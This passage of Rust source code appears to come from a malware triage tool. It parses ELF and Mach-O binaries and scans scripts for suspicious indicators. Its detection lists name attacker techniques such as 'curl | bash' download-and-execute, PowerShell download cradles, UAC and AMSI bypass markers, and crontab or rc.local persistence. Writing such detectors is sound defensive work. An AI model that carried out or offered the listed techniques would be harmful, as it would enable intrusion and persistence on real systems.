fn elf_cstr(buf: &[u8], idx: usize) -> String {
    if idx >= buf.len() { return String::new(); }
    let end = buf[idx..].iter().position(|&b| b == 0).unwrap_or(buf.len() - idx);
    String::from_utf8_lossy(&buf[idx..idx + end]).into_owned()
}

struct ElfShdrs {
    off:     usize,
    entsize: usize,
    num:     usize,
    strndx:  usize,
}

#[derive(Default)]
struct ElfSectionInfo {
    sec_flags:     u8,
    dynstr_offset: usize,
    dynstr_size:   usize,
    dynsym_offset: usize,
    dynsym_size:   usize,
    dynsym_entsize: usize,
}
impl ElfSectionInfo {
    const HAS_SYMTAB:       u8 = 0x01;
    const HAS_DEBUG_INFO:   u8 = 0x02;
    const HAS_GNU_DEBUGLINK: u8 = 0x04;
    const HAS_INIT_ARRAY:   u8 = 0x08;
    const HAS_FINI_ARRAY:   u8 = 0x10;
    const fn has_symtab(&self)       -> bool { self.sec_flags & Self::HAS_SYMTAB != 0 }
    const fn has_debug_info(&self)   -> bool { self.sec_flags & Self::HAS_DEBUG_INFO != 0 }
    const fn has_gnu_debuglink(&self)-> bool { self.sec_flags & Self::HAS_GNU_DEBUGLINK != 0 }
    const fn has_init_array(&self)   -> bool { self.sec_flags & Self::HAS_INIT_ARRAY != 0 }
    const fn has_fini_array(&self)   -> bool { self.sec_flags & Self::HAS_FINI_ARRAY != 0 }
}

// ---------------------------------------------------------------------------
// ElfTriageAnalyzer
// ---------------------------------------------------------------------------

pub struct ElfTriageAnalyzer;

impl ElfTriageAnalyzer {
    /// Parse ELF binary and populate `result` with ELF-specific indicators.
    pub fn analyze(data: &[u8], result: &mut TriageResult) {
        const SUSP_LIBS: &[(&str, ThreatLevel, &str)] = &[
            ("libcrypto", ThreatLevel::Low, "crypto library imported"),
            ("libssl",    ThreatLevel::Low, "SSL library imported"),
            ("libdl",     ThreatLevel::Low, "dynamic linker library \u{2014} may use dlopen"),
        ];
        if data.len() < 64 || &data[0..4] != b"\x7FELF" { return; }
        let is_64bit = data[4] == 2;
        let is_le    = data[5] == 1;

        if elf_u16(data, 16, is_le) == 3 {  // ET_DYN
            result.add_indicator(TriageIndicator {
                name: "elf-pic".to_string(),
                description: "ELF is position-independent (ET_DYN / PIE)".to_string(),
                threat_level: ThreatLevel::Informational,
                category: "elf-structure".to_string(),
                evidence: "e_type=ET_DYN".to_string(),
            });
        }
        if data.windows(4).take(256).any(|w| w == b"UPX!") {
            result.is_packed = true;
            result.add_indicator(TriageIndicator {
                name: "elf-upx-packed".to_string(),
                description: "UPX packer signature found in ELF header region".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "packing".to_string(),
                evidence: "magic=UPX!".to_string(),
            });
        }

        let (sh_off, sh_entsize, sh_num, sh_strndx) = if is_64bit {
            (usize::try_from(elf_u64(data, 40, is_le)).unwrap_or(data.len()),
             usize::from(elf_u16(data, 58, is_le)),
             usize::from(elf_u16(data, 60, is_le)),
             usize::from(elf_u16(data, 62, is_le)))
        } else {
            (usize::try_from(elf_u32(data, 32, is_le)).unwrap_or(data.len()),
             usize::from(elf_u16(data, 46, is_le)),
             usize::from(elf_u16(data, 48, is_le)),
             usize::from(elf_u16(data, 50, is_le)))
        };

        let sec = Self::scan_elf_sections(data, is_64bit, is_le,
                                          &ElfShdrs { off: sh_off, entsize: sh_entsize, num: sh_num, strndx: sh_strndx }, result);
        Self::emit_section_indicators(&sec, result);

        let dynstr: &[u8] = if sec.dynstr_offset > 0
            && sec.dynstr_offset + sec.dynstr_size <= data.len()
        { &data[sec.dynstr_offset..sec.dynstr_offset + sec.dynstr_size] } else { &[] };

        let mut dyn_strings: Vec<String> = Vec::new();
        if !dynstr.is_empty() {
            let mut start = 0usize;
            for (i, &b) in dynstr.iter().enumerate() {
                if b == 0 {
                    if i > start && let Ok(s) = std::str::from_utf8(&dynstr[start..i]) && !s.is_empty() {
                        dyn_strings.push(s.to_string());
                    }
                    start = i + 1;
                }
            }
        }
        for lib_str in &dyn_strings {
            for &(pat, lvl, desc) in SUSP_LIBS {
                if lib_str.contains(pat) {
                    result.add_indicator(TriageIndicator {
                        name: format!("elf-suspicious-lib:{lib_str}"),
                        description: format!("Suspicious library dependency: {lib_str} \u{2014} {desc}"),
                        threat_level: lvl,
                        category: "suspicious-import".to_string(),
                        evidence: format!("lib={lib_str}"),
                    });
                }
            }
        }

        if sec.dynsym_offset > 0 && sec.dynsym_entsize > 0
            && sec.dynsym_offset.saturating_add(sec.dynsym_size) <= data.len()
        {
            let sym_count = (sec.dynsym_size / sec.dynsym_entsize).min(4096);
            for si in 0..sym_count {
                let Some(sym_off) = si.checked_mul(sec.dynsym_entsize)
                    .and_then(|x| sec.dynsym_offset.checked_add(x)) else { break };
                if sym_off + sec.dynsym_entsize > data.len() { break; }
                let st_name = usize::try_from(elf_u32(data, sym_off, is_le)).unwrap_or(0);
                Self::check_suspicious_import(&elf_cstr(dynstr, st_name), result);
            }
        }

        let (ph_off, ph_entsize, ph_num) = if is_64bit {
            (usize::try_from(elf_u64(data, 32, is_le)).unwrap_or(data.len()),
             usize::from(elf_u16(data, 54, is_le)),
             usize::from(elf_u16(data, 56, is_le)))
        } else {
            (usize::try_from(elf_u32(data, 28, is_le)).unwrap_or(data.len()),
             usize::from(elf_u16(data, 42, is_le)),
             usize::from(elf_u16(data, 44, is_le)))
        };
        Self::scan_elf_phdrs(data, is_64bit, is_le, ph_off, ph_entsize, ph_num, result);
    }

    fn scan_elf_sections(
        data: &[u8], is_64bit: bool, is_le: bool,
        shdrs: &ElfShdrs,
        result: &mut TriageResult,
    ) -> ElfSectionInfo {
        let &ElfShdrs { off: sh_off, entsize: sh_entsize, num: sh_num, strndx: sh_strndx } = shdrs;
        let shstrtab: &[u8] = if sh_strndx < sh_num && sh_entsize > 0 {
            let Some(shdr_off) = sh_strndx.checked_mul(sh_entsize)
                .and_then(|x| sh_off.checked_add(x)) else {
                return ElfSectionInfo::default();
            };
            let (sh_offset, sh_size) = if is_64bit {
                (usize::try_from(elf_u64(data, shdr_off + 24, is_le)).unwrap_or(data.len()),
                 usize::try_from(elf_u64(data, shdr_off + 32, is_le)).unwrap_or(0))
            } else {
                (usize::try_from(elf_u32(data, shdr_off + 16, is_le)).unwrap_or(data.len()),
                 usize::try_from(elf_u32(data, shdr_off + 20, is_le)).unwrap_or(0))
            };
            if sh_offset + sh_size <= data.len() { &data[sh_offset..sh_offset + sh_size] } else { &[] }
        } else { &[] };

        let mut sec = ElfSectionInfo::default();
        for i in 0..sh_num {
            let Some(shdr_off) = i.checked_mul(sh_entsize).and_then(|x| sh_off.checked_add(x)) else { break };
            if shdr_off + sh_entsize > data.len() { break; }
            let sh_name_idx = usize::try_from(elf_u32(data, shdr_off, is_le)).unwrap_or(0);
            let sec_name = elf_cstr(shstrtab, sh_name_idx);
            match sec_name.as_str() {
                ".symtab"        => sec.sec_flags |= ElfSectionInfo::HAS_SYMTAB,
                ".debug_info"    => sec.sec_flags |= ElfSectionInfo::HAS_DEBUG_INFO,
                ".gnu_debuglink" => sec.sec_flags |= ElfSectionInfo::HAS_GNU_DEBUGLINK,
                ".init_array"    => sec.sec_flags |= ElfSectionInfo::HAS_INIT_ARRAY,
                ".fini_array"    => sec.sec_flags |= ElfSectionInfo::HAS_FINI_ARRAY,
                ".dynstr" => if is_64bit {
                    sec.dynstr_offset  = usize::try_from(elf_u64(data, shdr_off + 24, is_le)).unwrap_or(data.len());
                    sec.dynstr_size    = usize::try_from(elf_u64(data, shdr_off + 32, is_le)).unwrap_or(0);
                } else {
                    sec.dynstr_offset  = usize::try_from(elf_u32(data, shdr_off + 16, is_le)).unwrap_or(data.len());
                    sec.dynstr_size    = usize::try_from(elf_u32(data, shdr_off + 20, is_le)).unwrap_or(0);
                },
                ".dynsym" => if is_64bit {
                    sec.dynsym_offset  = usize::try_from(elf_u64(data, shdr_off + 24, is_le)).unwrap_or(data.len());
                    sec.dynsym_size    = usize::try_from(elf_u64(data, shdr_off + 32, is_le)).unwrap_or(0);
                    sec.dynsym_entsize = usize::try_from(elf_u64(data, shdr_off + 56, is_le)).unwrap_or(0);
                } else {
                    sec.dynsym_offset  = usize::try_from(elf_u32(data, shdr_off + 16, is_le)).unwrap_or(data.len());
                    sec.dynsym_size    = usize::try_from(elf_u32(data, shdr_off + 20, is_le)).unwrap_or(0);
                    sec.dynsym_entsize = usize::try_from(elf_u32(data, shdr_off + 36, is_le)).unwrap_or(0);
                },
                _ => {}
            }
            if sec_name.contains("UPX") {
                result.is_packed = true;
                result.add_indicator(TriageIndicator {
                    name: "elf-upx-section".to_string(),
                    description: format!("UPX section name detected: {sec_name}"),
                    threat_level: ThreatLevel::Medium,
                    category: "packing".to_string(),
                    evidence: format!("section={sec_name}"),
                });
            }
        }
        sec
    }

    fn emit_section_indicators(sec: &ElfSectionInfo, result: &mut TriageResult) {
        if !sec.has_symtab() {
            result.add_indicator(TriageIndicator {
                name: "elf-stripped".to_string(),
                description: "ELF binary is stripped (no .symtab section)".to_string(),
                threat_level: ThreatLevel::Low,
                category: "elf-structure".to_string(),
                evidence: "section=.symtab absent".to_string(),
            });
        }
        if sec.has_debug_info() || sec.has_gnu_debuglink() {
            result.add_indicator(TriageIndicator {
                name: "elf-debug-info".to_string(),
                description: "ELF binary contains debug information".to_string(),
                threat_level: ThreatLevel::Informational,
                category: "elf-structure".to_string(),
                evidence: format!("debug_info={} gnu_debuglink={}", sec.has_debug_info(), sec.has_gnu_debuglink()),
            });
        }
        if sec.has_init_array() {
            result.add_indicator(TriageIndicator {
                name: "elf-init-array".to_string(),
                description: ".init_array present \u{2014} may contain persistence constructors".to_string(),
                threat_level: ThreatLevel::Low,
                category: "persistence".to_string(),
                evidence: "section=.init_array".to_string(),
            });
        }
        if sec.has_fini_array() {
            result.add_indicator(TriageIndicator {
                name: "elf-fini-array".to_string(),
                description: ".fini_array present \u{2014} destructor table may run code at exit".to_string(),
                threat_level: ThreatLevel::Informational,
                category: "persistence".to_string(),
                evidence: "section=.fini_array".to_string(),
            });
        }
    }

    fn scan_elf_phdrs(
        data: &[u8], is_64bit: bool, is_le: bool,
        ph_off: usize, ph_entsize: usize, ph_num: usize,
        result: &mut TriageResult,
    ) {
        let mut has_gnu_stack = false;
        let mut gnu_stack_executable = false;
        let mut interp_path = String::new();
        for i in 0..ph_num {
            let Some(ph_start) = i.checked_mul(ph_entsize).and_then(|x| ph_off.checked_add(x)) else { break };
            if ph_start + ph_entsize > data.len() { break; }
            match elf_u32(data, ph_start, is_le) {
                3 => {  // PT_INTERP
                    let (p_offset, p_filesz) = if is_64bit {
                        (usize::try_from(elf_u64(data, ph_start + 8, is_le)).unwrap_or(data.len()),
                         usize::try_from(elf_u64(data, ph_start + 32, is_le)).unwrap_or(0))
                    } else {
                        (usize::try_from(elf_u32(data, ph_start + 4, is_le)).unwrap_or(data.len()),
                         usize::try_from(elf_u32(data, ph_start + 16, is_le)).unwrap_or(0))
                    };
                    if p_offset + p_filesz <= data.len() && p_filesz > 0 {
                        let end = p_filesz.saturating_sub(1);
                        interp_path = String::from_utf8_lossy(&data[p_offset..p_offset + end]).into_owned();
                    }
                }
                0x6474_e551 => {  // PT_GNU_STACK
                    has_gnu_stack = true;
                    let p_flags = if is_64bit { elf_u32(data, ph_start + 4, is_le) }
                                  else        { elf_u32(data, ph_start + 24, is_le) };
                    if p_flags & 1 != 0 { gnu_stack_executable = true; }
                }
                _ => {}
            }
        }
        if !has_gnu_stack {
            result.add_indicator(TriageIndicator {
                name: "elf-no-gnu-stack".to_string(),
                description: "No PT_GNU_STACK \u{2014} stack may default to executable".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "elf-structure".to_string(),
                evidence: "PT_GNU_STACK=absent".to_string(),
            });
        } else if gnu_stack_executable {
            result.add_indicator(TriageIndicator {
                name: "elf-executable-stack".to_string(),
                description: "PT_GNU_STACK is marked executable \u{2014} shellcode execution risk".to_string(),
                threat_level: ThreatLevel::High,
                category: "elf-structure".to_string(),
                evidence: "PT_GNU_STACK flags=PF_X".to_string(),
            });
        }
        if !interp_path.is_empty() {
            const KNOWN: &[&str] = &[
                "/lib/ld-linux.so.2", "/lib64/ld-linux-x86-64.so.2",
                "/lib/ld-musl-x86_64.so.1", "/lib/ld-musl-aarch64.so.1",
                "/lib/ld-linux-aarch64.so.1",
            ];
            if !KNOWN.iter().any(|&k| interp_path == k) {
                result.add_indicator(TriageIndicator {
                    name: "elf-unusual-interpreter".to_string(),
                    description: format!("Non-standard ELF interpreter: {interp_path}"),
                    threat_level: ThreatLevel::Medium,
                    category: "elf-structure".to_string(),
                    evidence: format!("interp={interp_path}"),
                });
            }
        }
    }

    fn check_suspicious_import(name: &str, result: &mut TriageResult) {
        if name.is_empty() {
            return;
        }
        let suspicious: &[(&str, ThreatLevel, &str)] = &[
            (
                "dlopen",
                ThreatLevel::Low,
                "dynamic library loading —  possible plugin or evasion",
            ),
            ("dlsym", ThreatLevel::Low, "dynamic symbol lookup"),
            (
                "system",
                ThreatLevel::Medium,
                "shell command execution via system()",
            ),
            (
                "execve",
                ThreatLevel::Medium,
                "process execution via execve()",
            ),
            (
                "execvp",
                ThreatLevel::Medium,
                "process execution via execvp()",
            ),
            (
                "execl",
                ThreatLevel::Medium,
                "process execution via execl()",
            ),
            ("popen", ThreatLevel::Medium, "shell pipe execution"),
            (
                "ptrace",
                ThreatLevel::Low,
                "ptrace —  anti-debug or process injection",
            ),
            (
                "mprotect",
                ThreatLevel::Medium,
                "memory protection change —  possible shellcode prep",
            ),
            (
                "memfd_create",
                ThreatLevel::High,
                "fileless execution via memfd_create()",
            ),
            (
                "process_vm_writev",
                ThreatLevel::High,
                "cross-process memory write",
            ),
            (
                "process_vm_readv",
                ThreatLevel::Medium,
                "cross-process memory read",
            ),
            (
                "mmap",
                ThreatLevel::Low,
                "memory mapping —  often benign but notable",
            ),
            ("fork", ThreatLevel::Informational, "process forking"),
        ];
        for &(sym, lvl, desc) in suspicious {
            if name == sym || name.starts_with(sym) {
                result.add_indicator(TriageIndicator {
                    name: format!("elf-suspicious-import:{name}"),
                    description: format!("Suspicious ELF import: {name} —  {desc}"),
                    threat_level: lvl,
                    category: "suspicious-import".to_string(),
                    evidence: format!("symbol={name}"),
                });
                return;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// MachoTriageAnalyzer — private helpers
// ---------------------------------------------------------------------------

fn macho_u32(data: &[u8], off: usize, is_le: bool) -> u32 {
    if off + 4 > data.len() { return 0; }
    if is_le { u32::from_le_bytes([data[off], data[off+1], data[off+2], data[off+3]]) }
    else      { u32::from_be_bytes([data[off], data[off+1], data[off+2], data[off+3]]) }
}

struct MachoLoadInfo {
    has_code_sig: bool,
    has_encrypt_info: bool,
    encrypt_cryptid: u32,
    imported_dylibs: Vec<String>,
    text_segment_writable: bool,
}

// ---------------------------------------------------------------------------
// MachoTriageAnalyzer
// ---------------------------------------------------------------------------

pub struct MachoTriageAnalyzer;

impl MachoTriageAnalyzer {
    pub fn analyze(data: &[u8], result: &mut TriageResult) {
        if data.len() < 28 { return; }
        let magic = u32::from_le_bytes([data[0], data[1], data[2], data[3]]);
        let (is_64bit, is_le) = match magic {
            0xFEED_FACE => (false, false),
            0xCEFA_EDFE => (false, true),
            0xFEED_FACF => (true, false),
            0xCFFA_EDFE => (true, true),
            _ => return,
        };

        let cputype    = macho_u32(data, 4, is_le).cast_signed();
        let filetype   = macho_u32(data, 12, is_le);
        let ncmds      = macho_u32(data, 16, is_le);
        let cpu_name   = match cputype { 7 => "x86", 12 => "ARM", 16_777_228 => "ARM64", 16_777_223 => "x86_64", _ => "unknown" };
        let filetype_name = match filetype { 2 => "MH_EXECUTE", 6 => "MH_DYLIB", 8 => "MH_BUNDLE", _ => "other" };

        result.add_indicator(TriageIndicator {
            name: "macho-metadata".to_string(),
            description: format!("Mach-O {filetype_name} for {cpu_name} ({} bit)", if is_64bit { 64 } else { 32 }),
            threat_level: ThreatLevel::Informational,
            category: "macho-structure".to_string(),
            evidence: format!("cpu={cpu_name} filetype={filetype_name} 64bit={is_64bit}"),
        });

        let hdr_size: usize = if is_64bit { 32 } else { 28 };
        let info = Self::walk_load_commands(data, is_le, ncmds, hdr_size, result);
        Self::emit_macho_indicators(cputype, &info, result);
    }

    fn walk_load_commands(
        data: &[u8], is_le: bool, ncmds: u32, hdr_size: usize,
        result: &mut TriageResult,
    ) -> MachoLoadInfo {
        let mut lc_off = hdr_size;
        let mut info = MachoLoadInfo {
            has_code_sig: false, has_encrypt_info: false, encrypt_cryptid: 0,
            imported_dylibs: Vec::new(), text_segment_writable: false,
        };
        for _ in 0..ncmds {
            if lc_off + 8 > data.len() { break; }
            let cmd     = macho_u32(data, lc_off, is_le);
            let cmdsize = usize::try_from(macho_u32(data, lc_off + 4, is_le)).unwrap_or(0);
            if cmdsize < 8 || lc_off + cmdsize > data.len() { break; }
            match cmd {
                0x1d => { info.has_code_sig = true; }
                0x21 => { info.has_encrypt_info = true; info.encrypt_cryptid = macho_u32(data, lc_off + 12, is_le); }
                0x2C => { info.has_encrypt_info = true; info.encrypt_cryptid = macho_u32(data, lc_off + 16, is_le); }
                0x0C => {
                    let name_off = usize::try_from(macho_u32(data, lc_off + 8, is_le)).unwrap_or(0);
                    let abs_off = lc_off + name_off;
                    if abs_off < lc_off + cmdsize && abs_off < data.len() {
                        let end = data[abs_off..lc_off + cmdsize].iter().position(|&b| b == 0).unwrap_or(cmdsize);
                        if let Ok(s) = std::str::from_utf8(&data[abs_off..abs_off + end]) {
                            info.imported_dylibs.push(s.to_string());
                        }
                    }
                }
                0x19 | 0x1 => {
                    let segname_bytes = &data[lc_off + 8..usize::min(lc_off + 24, data.len())];
                    let segname = String::from_utf8_lossy(segname_bytes).trim_end_matches('\0').to_string();
                    if segname == "__TEXT" {
                        let initprot_off = if cmd == 0x19 { lc_off + 56 } else { lc_off + 40 };
                        if macho_u32(data, initprot_off, is_le) & 2 != 0 { info.text_segment_writable = true; }
                    }
                }
                0x8000_0028 => {
                    result.add_indicator(TriageIndicator {
                        name: "macho-lc-main".to_string(),
                        description: "LC_MAIN present \u{2014} modern macOS executable entry point".to_string(),
                        threat_level: ThreatLevel::Informational,
                        category: "macho-structure".to_string(),
                        evidence: "cmd=LC_MAIN".to_string(),
                    });
                }
                _ => {}
            }
            lc_off += cmdsize;
        }
        info
    }

    fn emit_macho_indicators(cputype: i32, info: &MachoLoadInfo, result: &mut TriageResult) {
        const SUSP_DYLIBS: &[(&str, ThreatLevel, &str)] = &[
            ("libcrypto", ThreatLevel::Low, "crypto library"),
            ("libssl",    ThreatLevel::Low, "SSL library"),
            ("libc.dylib", ThreatLevel::Informational, "standard C library"),
        ];
        if info.has_code_sig {
            result.add_indicator(TriageIndicator {
                name: "macho-code-signed".to_string(),
                description: "Mach-O has a code signature (LC_CODE_SIGNATURE)".to_string(),
                threat_level: ThreatLevel::Informational,
                category: "macho-structure".to_string(),
                evidence: "LC_CODE_SIGNATURE=present".to_string(),
            });
        } else if cputype == 16_777_228 {
            result.add_indicator(TriageIndicator {
                name: "macho-arm64-no-sig".to_string(),
                description: "ARM64 Mach-O binary lacks code signature".to_string(),
                threat_level: ThreatLevel::Informational,
                category: "macho-structure".to_string(),
                evidence: "cpu=ARM64 code_sig=absent".to_string(),
            });
        }
        if info.has_encrypt_info && info.encrypt_cryptid != 0 {
            result.add_indicator(TriageIndicator {
                name: "macho-encrypted".to_string(),
                description: "Mach-O binary is encrypted (FairPlay or custom)".to_string(),
                threat_level: ThreatLevel::Informational,
                category: "macho-structure".to_string(),
                evidence: format!("cryptid={}", info.encrypt_cryptid),
            });
        }
        if info.text_segment_writable {
            result.add_indicator(TriageIndicator {
                name: "macho-writable-text".to_string(),
                description: "__TEXT segment has write permission \u{2014} unusual and suspicious".to_string(),
                threat_level: ThreatLevel::High,
                category: "macho-structure".to_string(),
                evidence: "__TEXT initprot includes VM_PROT_WRITE".to_string(),
            });
        }
        for dylib in &info.imported_dylibs {
            let lower = dylib.to_ascii_lowercase();
            for &(pat, lvl, desc) in SUSP_DYLIBS {
                if lower.contains(pat) {
                    result.add_indicator(TriageIndicator {
                        name: format!("macho-suspicious-dylib:{dylib}"),
                        description: format!("Suspicious dylib: {dylib} ({desc})"),
                        threat_level: lvl,
                        category: "suspicious-import".to_string(),
                        evidence: format!("dylib={dylib}"),
                    });
                    break;
                }
            }
        }
        if !info.imported_dylibs.is_empty() {
            result.add_indicator(TriageIndicator {
                name: "macho-imports".to_string(),
                description: format!("{} dylib(s) imported", info.imported_dylibs.len()),
                threat_level: ThreatLevel::Informational,
                category: "macho-structure".to_string(),
                evidence: info.imported_dylibs.join(", "),
            });
        }
    }
}

// ---------------------------------------------------------------------------
// ScriptTriageAnalyzer
// ---------------------------------------------------------------------------

pub struct ScriptTriageAnalyzer;

impl ScriptTriageAnalyzer {
    pub fn analyze(data: &[u8], result: &mut TriageResult) {
        // Only look at the first 64 KiB for performance
        let scan = &data[..data.len().min(65536)];
        let text = std::str::from_utf8(scan).map_or_else(|_| String::from_utf8_lossy(scan).into_owned(), String::from);
        let lower = text.to_ascii_lowercase();

        // Detect script type
        let script_type = Self::detect_type(&text);
        if let Some(stype) = &script_type {
            result.add_indicator(TriageIndicator {
                name: format!("script-type:{stype}"),
                description: format!("Script detected: {stype}"),
                threat_level: ThreatLevel::Informational,
                category: "script".to_string(),
                evidence: format!("type={stype}"),
            });
        }

        // PowerShell checks
        if matches!(script_type.as_deref(), Some("powershell" | "batch"))
            || lower.contains("powershell")
        {
            Self::analyze_powershell(&lower, result);
        }

        // VBScript
        if matches!(script_type.as_deref(), Some("vbscript"))
            || lower.contains("wscript")
            || lower.contains("createobject")
        {
            Self::analyze_vbscript(&lower, result);
        }

        // Shell script
        if matches!(script_type.as_deref(), Some("shell")) {
            Self::analyze_shell(&lower, result);
        }

        // General suspicious patterns for all script types
        Self::analyze_common(&lower, result);
    }

    fn detect_type(text: &str) -> Option<String> {
        if text.starts_with("#!/bin/sh")
            || text.starts_with("#!/bin/bash")
            || text.starts_with("#!/usr/bin/env bash")
        {
            return Some("shell".to_string());
        }
        if text.starts_with("#!/usr/bin/env python") || text.starts_with("#!/usr/bin/python") {
            return Some("python".to_string());
        }
        if text.starts_with("#!/usr/bin/env node") || text.starts_with("#!/usr/bin/node") {
            return Some("nodejs".to_string());
        }

        let lower = text.to_ascii_lowercase();

        // PowerShell heuristics. Besides the obvious markers, real-world
        // PowerShell payloads frequently omit any "powershell" token and rely
        // on idioms such as IEX, `New-Object`, and download-cradle calls, so
        // detect those as well to avoid skipping the PowerShell analysis pass.
        if lower.contains("param(")
            || lower.contains("-executionpolicy")
            || lower.contains("invoke-expression")
            || lower.contains("iex(")
            || lower.contains("iex (")
            || lower.contains("new-object")
            || lower.contains("downloadstring(")
            || lower.contains("downloadfile(")
            || lower.contains("invoke-webrequest")
        {
            return Some("powershell".to_string());
        }

        // Batch file
        if lower.starts_with("@echo off")
            || lower.starts_with("@echo on")
            || lower.contains("@echo off\r\n")
        {
            return Some("batch".to_string());
        }

        // VBScript
        if lower.contains("dim ") && lower.contains("wscript") {
            return Some("vbscript".to_string());
        }

        // Python
        if lower.contains("import ") && (lower.contains("def ") || lower.contains("class ")) {
            return Some("python".to_string());
        }

        // JavaScript/Node
        if lower.contains("require(") && lower.contains("module.exports") {
            return Some("nodejs".to_string());
        }

        None
    }

    fn analyze_powershell(lower: &str, result: &mut TriageResult) {
        const DOWNLOAD_PATTERNS: &[(&str, &str)] = &[
            ("new-object net.webclient", "WebClient download cradle"),
            ("invoke-webrequest", "Invoke-WebRequest download"),
            ("downloadstring(", "DownloadString download cradle"),
            ("downloadfile(", "DownloadFile download cradle"),
            ("system.net.webclient", "WebClient class instantiation"),
            ("bitstransfer", "BITS file transfer"),
            ("start-bitstransfer", "BITS file transfer"),
        ];
        if lower.contains("-encodedcommand") || lower.contains("-enc ") || lower.contains("-e ") {
            result.add_indicator(TriageIndicator {
                name: "ps-encoded-command".to_string(),
                description: "PowerShell encoded command \u{2014} likely obfuscation".to_string(),
                threat_level: ThreatLevel::High,
                category: "obfuscation".to_string(),
                evidence: "-EncodedCommand detected".to_string(),
            });
        }
        if lower.contains("invoke-expression") || lower.contains("iex(") || lower.contains("iex (") {
            result.add_indicator(TriageIndicator {
                name: "ps-invoke-expression".to_string(),
                description: "Invoke-Expression (IEX) \u{2014} dynamic code execution".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "obfuscation".to_string(),
                evidence: "IEX/Invoke-Expression".to_string(),
            });
        }
        for &(pat, desc) in DOWNLOAD_PATTERNS {
            if lower.contains(pat) {
                result.add_indicator(TriageIndicator {
                    name: format!("ps-download-cradle:{pat}"),
                    description: format!("PowerShell download cradle: {desc}"),
                    threat_level: ThreatLevel::High,
                    category: "network".to_string(),
                    evidence: format!("pattern={pat}"),
                });
            }
        }
        Self::analyze_powershell_evasion(lower, result);
    }

    fn analyze_powershell_evasion(lower: &str, result: &mut TriageResult) {
        const UAC_PATTERNS: &[&str] = &["fodhelper","eventvwr","sdclt","cmstp","computerdefaults","bypassuac","bypass uac"];
        if lower.contains("get-wmiobject") || lower.contains("invoke-wmimethod") || lower.contains("win32_process") {
            result.add_indicator(TriageIndicator {
                name: "ps-wmi-usage".to_string(),
                description: "WMI usage detected \u{2014} lateral movement or persistence".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "persistence".to_string(),
                evidence: "WMI/Win32_Process".to_string(),
            });
        }
        if lower.contains("register-scheduledtask") || lower.contains("new-scheduledtask") {
            result.add_indicator(TriageIndicator {
                name: "ps-scheduled-task".to_string(),
                description: "Scheduled task creation detected \u{2014} persistence mechanism".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "persistence".to_string(),
                evidence: "Register-ScheduledTask".to_string(),
            });
        }
        for &pat in UAC_PATTERNS {
            if lower.contains(pat) {
                result.add_indicator(TriageIndicator {
                    name: format!("ps-uac-bypass:{pat}"),
                    description: format!("Possible UAC bypass pattern: {pat}"),
                    threat_level: ThreatLevel::High,
                    category: "privilege-escalation".to_string(),
                    evidence: format!("pattern={pat}"),
                });
            }
        }
        if lower.contains("[convert]::frombase64string") || lower.contains("frombase64") {
            result.add_indicator(TriageIndicator {
                name: "ps-base64-decode".to_string(),
                description: "PowerShell Base64 decode \u{2014} payload decoding".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "obfuscation".to_string(),
                evidence: "FromBase64String".to_string(),
            });
        }
        if lower.contains("reflection.assembly") || lower.contains("[reflection.assembly]::load") || lower.contains("assembly::loadwithpartialname") {
            result.add_indicator(TriageIndicator {
                name: "ps-reflection-load".to_string(),
                description: "PowerShell reflection assembly loading \u{2014} fileless execution".to_string(),
                threat_level: ThreatLevel::High,
                category: "obfuscation".to_string(),
                evidence: "Reflection.Assembly::Load".to_string(),
            });
        }
        if lower.contains("amsiutils") || lower.contains("amsicontext") || lower.contains("amsiscanstring") {
            result.add_indicator(TriageIndicator {
                name: "ps-amsi-bypass".to_string(),
                description: "Possible AMSI bypass attempt".to_string(),
                threat_level: ThreatLevel::Critical,
                category: "evasion".to_string(),
                evidence: "AMSI bypass pattern".to_string(),
            });
        }
    }

    fn analyze_vbscript(lower: &str, result: &mut TriageResult) {
        if lower.contains("createobject(\"scripting.filesystemobject\")") {
            result.add_indicator(TriageIndicator {
                name: "vbs-filesystem".to_string(),
                description: "VBScript FileSystemObject —  file manipulation".to_string(),
                threat_level: ThreatLevel::Low,
                category: "file-operation".to_string(),
                evidence: "Scripting.FileSystemObject".to_string(),
            });
        }

        if lower.contains("createobject(\"shell.application\")") || lower.contains("wscript.shell")
        {
            result.add_indicator(TriageIndicator {
                name: "vbs-shell-execution".to_string(),
                description: "VBScript Shell.Application or WScript.Shell —  command execution"
                    .to_string(),
                threat_level: ThreatLevel::Medium,
                category: "command-execution".to_string(),
                evidence: "Shell.Application/WScript.Shell".to_string(),
            });
        }

        if lower.contains("xmlhttp") || lower.contains("winhttp") {
            result.add_indicator(TriageIndicator {
                name: "vbs-network".to_string(),
                description: "VBScript network access (XMLHTTP/WinHTTP)".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "network".to_string(),
                evidence: "XMLHTTP/WinHTTP".to_string(),
            });
        }
    }

    fn analyze_shell(lower: &str, result: &mut TriageResult) {
        let suspicious_patterns: &[(&str, ThreatLevel, &str)] = &[
            (
                "curl | bash",
                ThreatLevel::High,
                "Remote code execution via curl pipe to bash",
            ),
            (
                "curl -s | bash",
                ThreatLevel::High,
                "Silent curl pipe to bash",
            ),
            (
                "wget -q | bash",
                ThreatLevel::High,
                "Silent wget pipe to bash",
            ),
            (
                "chmod +x",
                ThreatLevel::Low,
                "Setting executable permission",
            ),
            ("nohup ", ThreatLevel::Low, "Background process persistence"),
            (
                "crontab -",
                ThreatLevel::Medium,
                "Crontab modification —  persistence",
            ),
            (
                "/etc/rc.local",
                ThreatLevel::Medium,
                "rc.local modification —  persistence",
            ),
            ("iptables", ThreatLevel::Low, "Firewall rule modification"),
            ("useradd ", ThreatLevel::Medium, "User account creation"),
            ("passwd ", ThreatLevel::Medium, "Password modification"),
        ];
        for &(pat, lvl, desc) in suspicious_patterns {
            if lower.contains(pat) {
                result.add_indicator(TriageIndicator {
                    name: format!("shell-suspicious:{pat}"),
                    description: desc.to_string(),
                    threat_level: lvl,
                    category: "command-execution".to_string(),
                    evidence: format!("pattern={pat}"),
                });
            }
        }
    }

    fn analyze_common(lower: &str, result: &mut TriageResult) {
        // Schtasks (batch/cmd)
        if lower.contains("schtasks") && lower.contains("/create") {
            result.add_indicator(TriageIndicator {
                name: "schtasks-create".to_string(),
                description: "Scheduled task creation via schtasks.exe".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "persistence".to_string(),
